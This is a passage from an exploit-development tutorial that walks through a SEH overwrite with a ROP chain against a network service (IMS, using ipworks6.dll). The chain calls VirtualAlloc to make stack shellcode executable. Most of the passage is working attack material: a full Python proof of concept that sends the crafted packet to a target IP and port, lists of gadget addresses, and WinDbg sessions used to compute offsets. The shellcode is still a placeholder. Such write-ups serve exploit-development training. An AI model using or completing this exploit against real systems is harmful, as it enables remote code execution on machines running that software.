0014f9dc  41414141
0014f9e0  42424242
0014f9e4  69696969
0014f9e8  00000200
0014f9ec  00001000
0014f9f0  00000040
```

Now find the needed offset from the saved `ESP` in `EAX`:

```
0:000> ? eax-0014f9dc  
Evaluate expression: 132 = 00000084
```

We need to use the offset value of -132:

```bash
python3 -c "print(hex(-132 & 0xFFFFFFFF))" # 0xffffff7c
```

Modify the PoC to use this value over `0xffffffff` and make sure the placeholder gets set correctly:

```
(3ec.a78): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000042 ebx=00000624 ecx=00000002 edx=00000001 esi=02574f20 edi=775423a0
eip=00466e3f esp=0014f8b4 ebp=0014fa10 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
IMS+0x66e3f:
00466e3f 88441dcc        mov     byte ptr [ebp+ebx-34h],al  ss:0023:00150000=41
0:000> bp 0x26381110
0:000> g
Breakpoint 0 hit
eax=0014fa60 ebx=7a4c304c ecx=00000000 edx=77a45e30 esi=69696969 edi=766f4da0
eip=26381110 esp=0014fa70 ebp=7a4c304c iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
ipworks6!NetCode_StaticDestroy+0xc7a5:
26381110 59              pop     ecx
0:000> dps eax-0x84 L0n6
0014f9dc  41414141
0014f9e0  42424242
0014f9e4  69696969
0014f9e8  00000200
0014f9ec  00001000
0014f9f0  00000040
0:000> bp 0x2635805a
0:000> g
Breakpoint 1 hit
eax=0014f9dc ebx=7a4c304c ecx=ffffff7c edx=77a45e30 esi=0014f9dc edi=766f4da0
eip=2635805a esp=0014fa84 ebp=7a4c304c iopl=0         nv up ei pl nz na po cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000203
ipworks6!POP_Do+0x19f:
2635805a 893e            mov     dword ptr [esi],edi  ds:0023:0014f9dc=41414141
0:000> t
eax=0014f9dc ebx=7a4c304c ecx=ffffff7c edx=77a45e30 esi=0014f9dc edi=766f4da0
eip=2635805c esp=0014fa84 ebp=7a4c304c iopl=0         nv up ei pl nz na po cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000203
ipworks6!POP_Do+0x1a1:
2635805c 5f              pop     edi
0:000> dps 0014f9dc L0n6
0014f9dc  766f4da0 KERNEL32!VirtualAllocStub
0014f9e0  42424242
0014f9e4  69696969
0014f9e8  00000200
0014f9ec  00001000
0014f9f0  00000040
```

Nice! We set the first placeholder!

## Writing lpAddress Placeholder

Next we need to set the `lpAddress` placeholder to be the address of our shellcode on the stack. Unfortunately we do not know where our shellcode will be yet. Instead, we will place dummy shellcode right after our ROP chain and use a static offset that we will not finalize until the ROP chain is complete. This is because, with each new ROP gadget, our relative stack offset to our shellcode will change. Thankfully, we can re-use the majority of the previous chain to complete this:

```assembly
0x2636a0d1: push esp ; add byte [eax], al ; pop esi ; retn 0x0004 
0x26356073: mov eax, esi ; pop esi ; ret  
0x26381110: pop ecx ; ret  
0x263ac3f6: add eax, ecx ; ret  
0x2634c744: push eax ; pop esi ; retn 0x0004 
0x2636f279: pop ebp ; ret 
0x2639fa5d: add eax, ebp ; ret  
0x263adf17: mov dword [esi], eax ; pop eax ; pop esi ; ret  
```

The only changes here are the last 3 gadgets. We use the previous chain to get into `ESI` a relative stack address and then use that same address and add a static value using `EBP` in order to get another relative offset to our shellcode **above** the ROP chain on the stack. We will fill in the offset for `EBP` once our ROP chain is done. Add this ROP chain segment to the PoC with some dummy shellcode:

```python
import sys, socket, struct, argparse, logging

SHELLCODE = (b"\x90" * 512) # dummy shellcode

BAD_BYTES = b"\x3e" # >
PAYLOAD_LENGTH = 2000

nSEH = b"L0Lz"                       # NOTE: not used
SEH  = struct.pack("<I", 0x2636e91e) # ipworks6.dll | mov eax, dword [ebp+0x0C] ; push ecx ; mov ecx, edi ; call dword [eax+0x2C] 

PLACEHOLDERS = [
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
# KERNEL32!VirtualAllocStub
# https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  0x41414141, # virtual address of KERNEL32!VirtualAllocStub from IAT
  0x42424242, # address of shellcode (same as lpAddress)
  0x69696969, # arg1: lpAddress 
  0x00000200, # arg2: dwSize (512 bytes)
  0x00001000, # arg3: flAllocationType (MEM_COMMIT = 0x00001000)
  0x00000040, # arg4: flProtect (PAGE_EXECUTE_READWRITE = 0x00000040)
]

ROP = [
  # NOTE: EDI = virtual address of KERNEL32!VirtualAllocStub
  0x2637abeb, # pop eax ; ret  
  0x263b4150, # // IAT for KERNEL32!VirtualAllocStub
  0x2635262e, # mov eax, dword [eax] ; pop esi ; retn 0x0004
  0x69696969, # // esi = junk
  0x2634c723, # push eax ; pop edi ; pop esi ; ret 
  0x69696969, # // junk from 'retn 0x0004' @ 0x2635262e
  0x69696969, # // esi = junk
  # NOTE: ESI = stack address of KERNEL32!VirtualAllocStub placeholder
  0x2637abeb, # pop eax ; ret  
  0x263c8b00, # // eax = data cave address
  0x2636a0d1, # push esp ; add byte [eax], al ; pop esi ; retn 0x0004 
  0x26356073, # mov eax, esi ; pop esi ; ret  
  0x69696969, # // junk from 'retn 0x0004' @ 0x2636a0d1
  0x69696969, # // esi = junk
  0x26381110, # pop ecx ; ret  
  0xffffff7c, # // ecx = -132
  0x263ac3f6, # add eax, ecx ; ret  
  0x2634c744, # push eax ; pop esi ; retn 0x0004 
  # NOTE: write KERNEL32!VirtualAllocStub placeholder
  0x2635805a, # mov dword [esi], edi ; pop edi ; pop esi ; ret  
  0x69696969, # // junk from 'retn 0x0004' @ 0x2634c744
  0x69696969, # // edi = junk
  0x69696969, # // esi = junk
  # NOTE: ESI = stack address of lpAddress placeholder
  0x2637abeb, # pop eax ; ret  
  0x263c8b00, # // eax = data cave address
  0x2636a0d1, # push esp ; add byte [eax], al ; pop esi ; retn 0x0004 
  0x26356073, # mov eax, esi ; pop esi ; ret  
  0x69696969, # // junk from 'retn 0x0004' @ 0x2636a0d1
  0x69696969, # // esi = junk
  0x26381110, # pop ecx ; ret  
  0xffffffff, # // ecx = UNKNOWN OFFSET
  0x263ac3f6, # add eax, ecx ; ret  
  0x2634c744, # push eax ; pop esi ; retn 0x0004 
  # NOTE: EAX = stack address of shellcode after ROP chain
  0x2636f279, # pop ebp ; ret 
  0x69696969, # // junk from 'retn 0x0004' @ 0x2634c744 
  0xffffffff, # // ebp = UNKNOWN OFFSET
  0x2639fa5d, # add eax, ebp ; ret  
  # NOTE: write lpAddress placeholder
  0x263adf17, # mov dword [esi], eax ; pop eax ; pop esi ; ret  
  0x69696969, # // eax = junk
  0x69696969, # // esi = junk
  # NOTE: END OF CHAIN
  0x69696969, 
]

def exploit(targetIp:str, targetPort:int) -> None:
  pkt  = b""
  pkt += b"".join([struct.pack("<I", _) for _ in PLACEHOLDERS])
  pkt += (b"A" * (40 - len(pkt)))
  # NOTE: SEH stack pivot starts here for gadget @ 0x263a5ded
  pkt += nSEH    # pop edi
  pkt += SEH     # pop esi
  pkt += b'L0Lz' # pop ebx
  # NOTE: pivot stack just past the gadget @ 0x263a5ded
  pkt += struct.pack("<I", 0x263ac8ec) # ipworks6.dll | add esp, 0x20 ; pop ebp ; ret
  # NOTE: filler up to the second SEH pivot gadget (minus 16 for 3x POP and 0x263ac8ec gadget)
  pkt += (b"C" * (0x2C - 16))
  # NOTE: second SEH stack pivot gadget to point stack to nSEH
  pkt += struct.pack("<I", 0x263a5ded) # ipworks6.dll | xchg eax, esp ; xor eax, eax ; pop edi ; pop esi ; pop ebx ; ret
  pkt += b'L0Lz' # pop ebp
  # NOTE: gadget @ 0x263ac8ec pivots the stack here to begin execution
  pkt += b"".join([struct.pack("<I", _) for _ in ROP])
  # NOTE: shellcode follows right after ROP chain from static offsets in chain
  pkt += SHELLCODE
  # NOTE: need to send 1600+ bytes to overwrite beyond top of thread's stack
  pkt += (b"B" * (PAYLOAD_LENGTH - len(pkt)))
  # NOTE: check for bad bytes
  for c in pkt:
    if c in BAD_BYTES:
      logging.error(f"found bad byte 0x{c:02x} in payload")
      sys.exit(-1)
  logging.info(f"sending {len(pkt)} byte payload to {targetIp}:{targetPort} ...")
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((targetIp, targetPort))
  s.send(b"<" + pkt)
  s.close()
  logging.success("DONE")

if __name__ == '__main__':
  # parse arguments
  parser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter)
  parser.add_argument('-t', '--target', help='target IP',   type=str, required=True)
  parser.add_argument('-p', '--port',   help='target port', type=int, required=False, default=10883)
  args = parser.parse_args()
  # define logger
  logging.basicConfig(format='[%(asctime)s][%(levelname)s] %(message)s', datefmt='%d %b %Y %H:%M:%S', level='INFO')
  logging.SUCCESS = logging.CRITICAL + 1
  logging.addLevelName(logging.SUCCESS, '\033[0m\033[1;32mGOOD\033[0m')
  logging.addLevelName(logging.ERROR,   '\033[0m\033[1;31mFAIL\033[0m')
  logging.addLevelName(logging.WARNING, '\033[0m\033[1;33mWARN\033[0m')
  logging.addLevelName(logging.INFO,    '\033[0m\033[1;36mINFO\033[0m')
  logging.success = lambda msg, *args: logging.getLogger(__name__)._log(logging.SUCCESS, msg, args)
  # run exploit
  exploit(args.target, args.port)
```

Send this PoC and calculate the offset needed for `ECX` as we did before (logic is the same). The offset for `EBP` **will not be known yet so leave it as `0xffffffff`**. You should get that the offset needed for `ECX` should be **180 bytes**:

```bash
python3 -c "print(hex(-180 & 0xFFFFFFFF))" # 0xffffff4c
```

## Writing Return Address Placeholder

The **last placeholder** we need to set is the return address for the call to `VirtualAlloc`. The last thing our ROP chain will do is pivot the stack to our placeholders so we effectively return _into_ `VirtualAlloc` with the arguments to the function set up. Once `VirtualAlloc` returns, it will use the "saved `EIP`" on the stack which is our shellcode address on the stack that should now be executable. This value should be the same as `lpAddress` that we just wrote. Since our gadget clobbered those values, we will just calculate them again. This is effectively just a copy and past of the previous ROP chain segment with different offset values!

```python
ROP = [
  # ... (omitted for space and has not changed)
  # NOTE: ESI = stack address of return placeholder
  0x2637abeb, # pop eax ; ret  
  0x263c8b00, # // eax = data cave address
  0x2636a0d1, # push esp ; add byte [eax], al ; pop esi ; retn 0x0004 
  0x26356073, # mov eax, esi ; pop esi ; ret  
  0x69696969, # // junk from 'retn 0x0004' @ 0x2636a0d1
  0x69696969, # // esi = junk
  0x26381110, # pop ecx ; ret  
  0xffffffff, # // ecx = UNKNOWN OFFSET
  0x263ac3f6, # add eax, ecx ; ret  
  0x2634c744, # push eax ; pop esi ; retn 0x0004 
  # NOTE: EAX = stack address of shellcode after ROP chain
  0x2636f279, # pop ebp ; ret 
  0x69696969, # // junk from 'retn 0x0004' @ 0x2634c744 
  0xffffffff, # // ebp = UNKNOWN OFFSET
  0x2639fa5d, # add eax, ebp ; ret  
  # NOTE: write return address placeholder
  0x263adf17, # mov dword [esi], eax ; pop eax ; pop esi ; ret  
  0x69696969, # // eax = junk
  0x69696969, # // esi = junk
  # NOTE: END OF CHAIN
  0x69696969, 
]
```

Run the above slightly modified ROP chain and calculate the needed offset in `ECX` again. 

**NOTE:** `EBP` still has an unknown offset we will calculate later...

Following the same logic as before, the new `ECX` offset for this placeholder relative to `ESP` is **252 bytes**:

```bash
python3 -c "print(hex(-252 & 0xFFFFFFFF))" # 0xffffff04
```

## Placeholders Stack Pivot

We are almost done. The last thing our ROP chain must to is pivot the stack to the placeholders. This can be done using the following gadgets:

```assembly
0x2636a0d1: push esp ; add byte [eax], al ; pop esi ; retn 0x0004 
0x26356073: mov eax, esi ; pop esi ; ret  
0x26381110: pop ecx ; ret  
0x263ac3f6: add eax, ecx ; ret  
0x263a5ded: xchg eax, esp ; xor eax, eax ; pop edi ; pop esi ; pop ebx ; ret
```

The only catch with these gadgets is that we need to account for the 3 extra `POP` instructions before the `RET` in the gadget at `0x263a5ded`. This means we need to make sure our offset moves the stack reference 12 bytes **before** our placeholders so that the `RET` is aligned to return to the `VirtualAlloc` placeholder we made. Add these to the ROP chain with a dummy offset for `ECX`:

```python
ROP = [
  # ... (omitted for space and has not changed)
  # NOTE: stack pivot to placeholders
  0x2637abeb, # pop eax ; ret  
  0x263c8b00, # // eax = data cave address
  0x2636a0d1, # push esp ; add byte [eax], al ; pop esi ; retn 0x0004 
  0x26356073, # mov eax, esi ; pop esi ; ret  
  0x69696969, # // junk from 'retn 0x0004' @ 0x2636a0d1
  0x69696969, # // esi = junk
  0x26381110, # pop ecx ; ret  
  0xffffffff, # // ecx = UNKNOWN OFFSET
  0x263ac3f6, # add eax, ecx ; ret  
  0x263a5ded, # xchg eax, esp ; xor eax, eax ; pop edi ; pop esi ; pop ebx ; ret
  # NOTE: END OF CHAIN
  0x69696969, 
]
```

To calculate the `ECX` offset, run the PoC and step though each placeholder write:

```
(1688.12b4): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000042 ebx=00000624 ecx=00000002 edx=00000001 esi=02874f20 edi=775423a0
eip=00466e3f esp=0014f8b4 ebp=0014fa10 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
IMS+0x66e3f:
00466e3f 88441dcc        mov     byte ptr [ebp+ebx-34h],al  ss:0023:00150000=41
0:000> bp 0x26381110
0:000> g
Breakpoint 0 hit
eax=0014fa60 ebx=7a4c304c ecx=00000000 edx=77a45e30 esi=69696969 edi=766f4da0
eip=26381110 esp=0014fa70 ebp=7a4c304c iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
ipworks6!NetCode_StaticDestroy+0xc7a5:
26381110 59              pop     ecx
0:000> !teb
TEB at 00278000
    ExceptionList:        0014f2d4
    StackBase:            00150000
    StackLimit:           0014b000
    SubSystemTib:         00000000
    FiberData:            00001e00
    ArbitraryUserPointer: 00000000
    Self:                 00278000
    EnvironmentPointer:   00000000
    ClientId:             00001688 . 000012b4
    RpcHandle:            00000000
    Tls Storage:          0078ed68
    PEB Address:          00277000
    LastErrorValue:       0
    LastStatusValue:      c0000034
    Count Owned Locks:    0
    HardErrorMode:        0
0:000> s -a 0014b000 00150000 AAAABBBBiiii
0014f9dc  41 41 41 41 42 42 42 42-69 69 69 69 00 02 00 00  AAAABBBBiiii....
0:000> dps 0014f9dc  L0n6
0014f9dc  41414141
0014f9e0  42424242
0014f9e4  69696969
0014f9e8  00000200
0014f9ec  00001000
0014f9f0  00000040
0:000> g
Breakpoint 0 hit
eax=0014fa98 ebx=7a4c304c ecx=ffffff7c edx=77a45e30 esi=69696969 edi=69696969
eip=26381110 esp=0014faa8 ebp=7a4c304c iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
ipworks6!NetCode_StaticDestroy+0xc7a5:
26381110 59              pop     ecx
0:000> dps 0014f9dc  L0n6
0014f9dc  766f4da0 KERNEL32!VirtualAllocStub
0014f9e0  42424242
0014f9e4  69696969
0014f9e8  00000200
0014f9ec  00001000
0014f9f0  00000040
0:000> g
Breakpoint 0 hit
eax=0014fadc ebx=7a4c304c ecx=ffffff4c edx=77a45e30 esi=69696969 edi=69696969
eip=26381110 esp=0014faec ebp=ffffffff iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
ipworks6!NetCode_StaticDestroy+0xc7a5:
26381110 59              pop     ecx
0:000> dps 0014f9dc  L0n6
0014f9dc  766f4da0 KERNEL32!VirtualAllocStub
0014f9e0  42424242
0014f9e4  0014f9e3
0014f9e8  00000200
0014f9ec  00001000
0014f9f0  00000040
0:000> g
Breakpoint 0 hit
eax=0014fb20 ebx=7a4c304c ecx=ffffff04 edx=77a45e30 esi=69696969 edi=69696969
eip=26381110 esp=0014fb30 ebp=ffffffff iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
ipworks6!NetCode_StaticDestroy+0xc7a5:
26381110 59              pop     ecx
0:000> dps 0014f9dc  L0n6
0014f9dc  766f4da0 KERNEL32!VirtualAllocStub
0014f9e0  0014f9df
0014f9e4  0014f9e3
0014f9e8  00000200
0014f9ec  00001000
0014f9f0  00000040
```

Here we see each placeholder write in action by setting a breakpoint on the `POP ECX` gadget. At the last one, we need to calculate the value needed to ensure we return into `VirtualAlloc`:

**NOTE:** We had to account for 12 bytes with `0x0C` for the 3x `POP` instructions by moving our `EAX` reference to `ESP` **up** by 12 bytes!

```
0:000> ? eax+0x0c-0014f9dc  
Evaluate expression: 336 = 00000150
```

It seems we need to use an offset of **336 bytes**. Update the PoC and ensure we call `VirtualAlloc`:

```bash
python3 -c "print(hex(-336 & 0xFFFFFFFF))" # 0xfffffeb0
```

Sending the new PoC with the updated offset for `ECX`, lands us in `VirtualAlloc`:

```
(1c1c.1e84): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000042 ebx=00000624 ecx=00000002 edx=00000001 esi=01ba4f20 edi=775423a0
eip=00466e3f esp=0014f8b4 ebp=0014fa10 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
IMS+0x66e3f:
00466e3f 88441dcc        mov     byte ptr [ebp+ebx-34h],al  ss:0023:00150000=41
0:000> bp KERNEL32!VirtualAllocStub
0:000> g
Breakpoint 0 hit
eax=00000000 ebx=423c0000 ecx=fffffeb0 edx=77a45e30 esi=01ba4fbc edi=01ba4fb8
eip=766f4da0 esp=0014f9e0 ebp=ffffffff iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
KERNEL32!VirtualAllocStub:
766f4da0 8bff            mov     edi,edi
0:000> dps esp L0n5
0014f9e0  0014f9df
0014f9e4  0014f9e3
0014f9e8  00000200
0014f9ec  00001000
0014f9f0  00000040
```

The last thing we need to fix are the 2 offsets for `EBP` to reference our shellcode on the stack. To fix this, add a special string "bubbagump" to the start of the shellcode we can search for and then set a breakpoint on the `POP EBP` gadget to fix both offsets:

```python
import sys, socket, struct, argparse, logging

SHELLCODE = b"bubbagump" + (b"\x90" * 512) # dummy shellcode

BAD_BYTES = b"\x3e" # >
PAYLOAD_LENGTH = 2000

nSEH = b"L0Lz"                       # NOTE: not used
SEH  = struct.pack("<I", 0x2636e91e) # ipworks6.dll | mov eax, dword [ebp+0x0C] ; push ecx ; mov ecx, edi ; call dword [eax+0x2C] 

PLACEHOLDERS = [
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
# KERNEL32!VirtualAllocStub
# https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  0x41414141, # virtual address of KERNEL32!VirtualAllocStub from IAT
  0x42424242, # address of shellcode (same as lpAddress)
  0x69696969, # arg1: lpAddress 
  0x00000200, # arg2: dwSize (512 bytes)
  0x00001000, # arg3: flAllocationType (MEM_COMMIT = 0x00001000)
  0x00000040, # arg4: flProtect (PAGE_EXECUTE_READWRITE = 0x00000040)
]

ROP = [
  # NOTE: EDI = virtual address of KERNEL32!VirtualAllocStub
  0x2637abeb, # pop eax ; ret  
  0x263b4150, # // IAT for KERNEL32!VirtualAllocStub
  0x2635262e, # mov eax, dword [eax] ; pop esi ; retn 0x0004
  0x69696969, # // esi = junk
  0x2634c723, # push eax ; pop edi ; pop esi ; ret 
  0x69696969, # // junk from 'retn 0x0004' @ 0x2635262e
  0x69696969, # // esi = junk
  # NOTE: ESI = stack address of KERNEL32!VirtualAllocStub placeholder
  0x2637abeb, # pop eax ; ret  
  0x263c8b00, # // eax = data cave address
  0x2636a0d1, # push esp ; add byte [eax], al ; pop esi ; retn 0x0004 
  0x26356073, # mov eax, esi ; pop esi ; ret  
  0x69696969, # // junk from 'retn 0x0004' @ 0x2636a0d1
  0x69696969, # // esi = junk
  0x26381110, # pop ecx ; ret  
  0xffffff7c, # // ecx = -132
  0x263ac3f6, # add eax, ecx ; ret  
  0x2634c744, # push eax ; pop esi ; retn 0x0004 
  # NOTE: write KERNEL32!VirtualAllocStub placeholder
  0x2635805a, # mov dword [esi], edi ; pop edi ; pop esi ; ret  
  0x69696969, # // junk from 'retn 0x0004' @ 0x2634c744
  0x69696969, # // edi = junk
  0x69696969, # // esi = junk
  # NOTE: ESI = stack address of lpAddress placeholder
  0x2637abeb, # pop eax ; ret  
  0x263c8b00, # // eax = data cave address
  0x2636a0d1, # push esp ; add byte [eax], al ; pop esi ; retn 0x0004 
  0x26356073, # mov eax, esi ; pop esi ; ret  
  0x69696969, # // junk from 'retn 0x0004' @ 0x2636a0d1
  0x69696969, # // esi = junk
  0x26381110, # pop ecx ; ret  
  0xffffff4c, # // ecx = -180
  0x263ac3f6, # add eax, ecx ; ret  
  0x2634c744, # push eax ; pop esi ; retn 0x0004 
  # NOTE: EAX = stack address of shellcode after ROP chain
  0x2636f279, # pop ebp ; ret 
  0x69696969, # // junk from 'retn 0x0004' @ 0x2634c744 
  0xffffffff, # // ebp = UNKNOWN OFFSET
  0x2639fa5d, # add eax, ebp ; ret  
  # NOTE: write lpAddress placeholder
  0x263adf17, # mov dword [esi], eax ; pop eax ; pop esi ; ret  
  0x69696969, # // eax = junk
  0x69696969, # // esi = junk
  # NOTE: ESI = stack address of return placeholder
  0x2637abeb, # pop eax ; ret  
  0x263c8b00, # // eax = data cave address
  0x2636a0d1, # push esp ; add byte [eax], al ; pop esi ; retn 0x0004 
  0x26356073, # mov eax, esi ; pop esi ; ret  
  0x69696969, # // junk from 'retn 0x0004' @ 0x2636a0d1
  0x69696969, # // esi = junk
  0x26381110, # pop ecx ; ret  
  0xffffff04, # // ecx = -252
  0x263ac3f6, # add eax, ecx ; ret  
  0x2634c744, # push eax ; pop esi ; retn 0x0004 
  # NOTE: EAX = stack address of shellcode after ROP chain
  0x2636f279, # pop ebp ; ret 
  0x69696969, # // junk from 'retn 0x0004' @ 0x2634c744 
  0xffffffff, # // ebp = UNKNOWN OFFSET
  0x2639fa5d, # add eax, ebp ; ret  
  # NOTE: write return address placeholder
  0x263adf17, # mov dword [esi], eax ; pop eax ; pop esi ; ret  
  0x69696969, # // eax = junk
  0x69696969, # // esi = junk
  # NOTE: stack pivot to placeholders
  0x2637abeb, # pop eax ; ret  
  0x263c8b00, # // eax = data cave address
  0x2636a0d1, # push esp ; add byte [eax], al ; pop esi ; retn 0x0004 
  0x26356073, # mov eax, esi ; pop esi ; ret  
  0x69696969, # // junk from 'retn 0x0004' @ 0x2636a0d1
  0x69696969, # // esi = junk
  0x26381110, # pop ecx ; ret  
  0xfffffeb0, # // ecx = -336
  0x263ac3f6, # add eax, ecx ; ret  
  0x263a5ded, # xchg eax, esp ; xor eax, eax ; pop edi ; pop esi ; pop ebx ; ret
  # NOTE: END OF CHAIN
  0x69696969, 
]

def exploit(targetIp:str, targetPort:int) -> None:
  pkt  = b""
  pkt += b"".join([struct.pack("<I", _) for _ in PLACEHOLDERS])
  pkt += (b"A" * (40 - len(pkt)))
  # NOTE: SEH stack pivot starts here for gadget @ 0x263a5ded
  pkt += nSEH    # 'pop edi' from gadget @ 0x263a5ded
  pkt += SEH     # 'pop esi' from gadget @ 0x263a5ded
  pkt += b'L0Lz' # 'pop ebx' from gadget @ 0x263a5ded
  # NOTE: pivot stack just past the gadget @ 0x263a5ded
  pkt += struct.pack("<I", 0x263ac8ec) # ipworks6.dll | add esp, 0x20 ; pop ebp ; ret
  # NOTE: filler up to the second SEH pivot gadget (minus 16 for 3x POP and 0x263ac8ec gadget)
  pkt += (b"C" * (0x2C - 16))
  # NOTE: second SEH stack pivot gadget to point stack to nSEH
  pkt += struct.pack("<I", 0x263a5ded) # ipworks6.dll | xchg eax, esp ; xor eax, eax ; pop edi ; pop esi ; pop ebx ; ret
  pkt += b'L0Lz' # 'pop ebp' from gadget @ 0x263ac8ec
  # NOTE: gadget @ 0x263ac8ec pivots the stack here to begin execution
  pkt += b"".join([struct.pack("<I", _) for _ in ROP])
  # NOTE: shellcode follows right after ROP chain from static offsets in chain
  pkt += SHELLCODE
  # NOTE: need to send 1600+ bytes to overwrite beyond top of thread's stack
  pkt += (b"B" * (PAYLOAD_LENGTH - len(pkt)))
  # NOTE: check for bad bytes
  for c in pkt:
    if c in BAD_BYTES:
      logging.error(f"found bad byte 0x{c:02x} in payload")
      sys.exit(-1)
  logging.info(f"sending {len(pkt)} byte payload to {targetIp}:{targetPort} ...")
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((targetIp, targetPort))
  s.send(b"<" + pkt)
  s.close()
  logging.success("DONE")

if __name__ == '__main__':
  # parse arguments
  parser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter)
  parser.add_argument('-t', '--target', help='target IP',   type=str, required=True)
  parser.add_argument('-p', '--port',   help='target port', type=int, required=False, default=10883)
  args = parser.parse_args()
  # define logger
  logging.basicConfig(format='[%(asctime)s][%(levelname)s] %(message)s', datefmt='%d %b %Y %H:%M:%S', level='INFO')
  logging.SUCCESS = logging.CRITICAL + 1
  logging.addLevelName(logging.SUCCESS, '\033[0m\033[1;32mGOOD\033[0m')
  logging.addLevelName(logging.ERROR,   '\033[0m\033[1;31mFAIL\033[0m')
  logging.addLevelName(logging.WARNING, '\033[0m\033[1;33mWARN\033[0m')
  logging.addLevelName(logging.INFO,    '\033[0m\033[1;36mINFO\033[0m')
  logging.success = lambda msg, *args: logging.getLogger(__name__)._log(logging.SUCCESS, msg, args)
  # run exploit
  exploit(args.target, args.port)
```

Sending the above PoC results in the following offset calculations:

```
(184c.11b8): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000042 ebx=00000624 ecx=00000002 edx=00000001 esi=028f4f20 edi=775423a0
eip=00466e3f esp=0014f8b4 ebp=0014fa10 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
IMS+0x66e3f:
00466e3f 88441dcc        mov     byte ptr [ebp+ebx-34h],al  ss:0023:00150000=41
0:000> bp 0x2636f279
0:000> g
Breakpoint 0 hit
eax=0014f9e4 ebx=7a4c304c ecx=ffffff4c edx=77a45e30 esi=0014f9e4 edi=69696969
eip=2636f279 esp=0014fabc ebp=7a4c304c iopl=0         nv up ei pl nz ac pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000217
ipworks6!XMPP_Do+0x17bf:
2636f279 5d              pop     ebp
0:000> !teb
TEB at 003db000
    ExceptionList:        0014f2d4
    StackBase:            00150000
    StackLimit:           0014b000
    SubSystemTib:         00000000
    FiberData:            00001e00
    ArbitraryUserPointer: 00000000
    Self:                 003db000
    EnvironmentPointer:   00000000
    ClientId:             0000184c . 000011b8
    RpcHandle:            00000000
    Tls Storage:          0076eee8
    PEB Address:          003da000
    LastErrorValue:       0
    LastStatusValue:      c0000034
    Count Owned Locks:    0
    HardErrorMode:        0
0:000> s -a 0014b000 00150000 bubbagump
0014fb40  62 75 62 62 61 67 75 6d-70 90 90 90 90 90 90 90  bubbagump.......
0:000> ? 0014fb40-eax
Evaluate expression: 348 = 0000015c
0:000> g
Breakpoint 0 hit
eax=0014f9e0 ebx=7a4c304c ecx=ffffff04 edx=77a45e30 esi=0014f9e0 edi=69696969
eip=2636f279 esp=0014fb00 ebp=ffffffff iopl=0         nv up ei pl nz ac po cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000213
ipworks6!XMPP_Do+0x17bf:
2636f279 5d              pop     ebp
0:000> ? 0014fb40-eax
Evaluate expression: 352 = 00000160
```

Here it shows we need offset values **348** and **352** respectively:

**NOTE:** These are **positive** offsets since the shellcode is **above** the ROP chain on the stack!

```bash
python3 -c "print(hex(348 & 0xFFFFFFFF))" # 0x15c
python3 -c "print(hex(352 & 0xFFFFFFFF))" # 0x160
```

Now re-run the PoC with all offsets filled-in and check if the call to `VirtualAlloc` is correct:

```
(700.abc): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000042 ebx=00000624 ecx=00000002 edx=00000001 esi=02864f20 edi=775423a0
eip=00466e3f esp=0014f8b4 ebp=0014fa10 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
IMS+0x66e3f:
00466e3f 88441dcc        mov     byte ptr [ebp+ebx-34h],al  ss:0023:00150000=41
0:000> bp KERNEL32!VirtualAllocStub
0:000> g
Breakpoint 0 hit
eax=00000000 ebx=423c0000 ecx=fffffeb0 edx=77a45e30 esi=02864fbc edi=02864fb8
eip=766f4da0 esp=0014f9e0 ebp=00000160 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
KERNEL32!VirtualAllocStub:
766f4da0 8bff            mov     edi,edi
